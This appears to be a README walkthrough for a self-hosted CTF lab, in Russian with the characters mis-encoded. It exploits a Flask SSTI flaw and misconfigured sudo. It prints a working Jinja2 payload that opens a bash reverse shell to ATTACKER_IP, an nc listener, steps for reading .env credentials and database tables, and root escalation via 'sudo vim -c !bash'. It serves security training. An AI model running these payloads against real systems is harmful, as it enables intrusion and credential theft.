## üì¶ –ó–∞–ø—É—Å–∫

–î–ª—è –∑–∞–ø—É—Å–∫–∞ –∑–∞–¥–∞–Ω–∏—è –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è `startup.sh`, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–¥–Ω–∏–º–∞–µ—Ç –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—É —Å –ø–æ–º–æ—â—å—é `docker-compose`:

```bash
chmod +x startup.sh
./startup.sh
```

–ë—É–¥—É—Ç —Ä–∞–∑–≤–µ—Ä–Ω—É—Ç—ã —Å–ª–µ–¥—É—é—â–∏–µ —Å–µ—Ä–≤–∏—Å—ã:

- `flask` ‚Äî —É—è–∑–≤–∏–º–æ–µ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —Å SSTI.
- `db` ‚Äî –±–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö PostgreSQL.
- `ssh_server` ‚Äî –º–∞—à–∏–Ω–∞ —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º `user2`, –∏–º–µ—é—â–∏–º –ø–æ–≤—ã—à–µ–Ω–Ω—ã–µ –ø—Ä–∞–≤–∞.

---

## üï≥Ô∏è –£—è–∑–≤–∏–º–æ—Å—Ç–∏

### 1. Server-Side Template Injection (SSTI)

–ù–∞ —Å–∞–π—Ç–µ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–∞ —Ñ–æ—Ä–º–∞ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –æ—Ç–∑—ã–≤–æ–≤. –û–¥–Ω–∞–∫–æ –≤–≤–æ–¥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç—Å—è —á–µ—Ä–µ–∑ `render_template_string`, —á—Ç–æ –¥–µ–ª–∞–µ—Ç —Å–∞–π—Ç —É—è–∑–≤–∏–º—ã–º –∫ SSTI.

### 2. –ò–∑–±—ã—Ç–æ—á–Ω—ã–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å `user2` –º–æ–∂–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –∫–æ–º–∞–Ω–¥ —Å –ø–æ–º–æ—â—å—é `sudo` –±–µ–∑ –≤–≤–æ–¥–∞ –ø–∞—Ä–æ–ª—è, –≤–∫–ª—é—á–∞—è `vim`, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–æ–ª—É—á–∏—Ç—å root-–¥–æ—Å—Ç—É–ø:

```bash
sudo vim -c '!bash'
```

---

## üö© –ü–æ—à–∞–≥–æ–≤–æ–µ –ø—Ä–æ—Ö–æ–∂–¥–µ–Ω–∏–µ

### 1. –ü–æ–ª—É—á–µ–Ω–∏–µ Reverse Shell —á–µ—Ä–µ–∑ SSTI

–í—Å—Ç–∞–≤—å payload –≤ —Å—Ç—Ä–æ–∫—É URL:

```jinja
{{''.__class__.mro()[1].__subclasses__()[ID]("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'",shell=True,stdout=-1).communicate()[0].strip()}}
```

- –ó–∞–º–µ–Ω–∏—Ç–µ `ATTACKER_IP` –Ω–∞ gateway –≤–∞—à–µ–π `docker-compose` —Å–µ—Ç–∏. –ï–≥–æ –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ —á–µ—Ä–µ–∑:

```bash
docker network inspect <network_name>
```

- –ü—Ä–∏–º–µ—Ä –ø—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏—è:

```bash
nc -lvnp 4444
```

- –ß—Ç–æ–±—ã –Ω–∞–π—Ç–∏ –Ω—É–∂–Ω—ã–π ID –¥–ª—è `subclasses()`, –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ:

```jinja
{{''.__class__.__base__.__subclasses__()}}
```

### 2. –ü–æ–∏—Å–∫ —Ñ–ª–∞–≥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ .env

–ü–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è shell –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è `webuser`, –≤—ã–ø–æ–ª–Ω–∏:

```bash
ls -la
cat user.txt         # —Ñ–ª–∞–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
cat .env             # —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è PostgreSQL
```

### 3. –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö

```bash
psql -h db -U ctf_user -d ctf_db
```

- –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Ç–∞–±–ª–∏—Ü—ã:

```sql
\dt
```

- –ü–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:

```sql
SELECT * FROM users;
```

### 4. –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –ø–æ SSH

–ò—Å–ø–æ–ª—å–∑—É–π –ø–æ–ª—É—á–µ–Ω–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:

```bash
ssh user2@localhost -p 2222
```

–í–≤–µ–¥–∏ –ø–∞—Ä–æ–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è `user2`.

### 5. –≠—Å–∫–∞–ª–∞—Ü–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π —á–µ—Ä–µ–∑ sudo

–ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –¥–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:

```bash
sudo -l
```

–ï—Å–ª–∏ `vim` –¥–æ—Å—Ç—É–ø–µ–Ω –±–µ–∑ –ø–∞—Ä–æ–ª—è:

```bash
sudo vim -c '!bash'
```

–¢–µ–ø–µ—Ä—å —Ç—ã root. –ü–æ–ª—É—á–∏ root-—Ñ–ª–∞–≥:

```bash
cat /root/root.txt
```

---

## üß† –ü–æ–ª–µ–∑–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã

```bash
ls -la
ps aux
whoami
```

---

## ‚úÖ –§–ª–∞–≥–∏

- `user.txt` ‚Äî –≤ –¥–æ–º–∞—à–Ω–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ `webuser`.
- `root.txt` ‚Äî –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ `/root`, –¥–æ—Å—Ç—É–ø–µ–Ω —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ —ç—Å–∫–∞–ª–∞—Ü–∏–∏.## –ò—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏

–í –¥–∞–Ω–Ω–æ–π CTF —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω—ã —Å–ª–µ–¥—É—é—â–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏:

1. **Server-Side Template Injection (SSTI)**  
   –í–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–∞ Flask —É—è–∑–≤–∏–º–æ –∫ –≤–Ω–µ–¥—Ä–µ–Ω–∏—é —à–∞–±–ª–æ–Ω–æ–≤ —á–µ—Ä–µ–∑ Jinja2, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–π –∫–æ–¥ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ –∏ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–æ–º–∞–Ω–¥–Ω–æ–π –æ–±–æ–ª–æ—á–∫–µ.

2. **–ò–∑–±—ã—Ç–æ—á–Ω—ã–µ –ø—Ä–∞–≤–∞ sudo —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è**  
   –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å `user2` –∏–º–µ–µ—Ç –ø—Ä–∞–≤–æ –∑–∞–ø—É—Å–∫–∞—Ç—å `vim`, `less`, `tail`, `find` —Å –ø–æ–º–æ—â—å—é `sudo` –±–µ–∑ –≤–≤–æ–¥–∞ –ø–∞—Ä–æ–ª—è. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–∞–Ω–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã –¥–ª—è –æ–±—Ö–æ–¥–∞ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥ –æ—Ç –∏–º–µ–Ω–∏ —Å—É–ø–µ—Ä–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (root).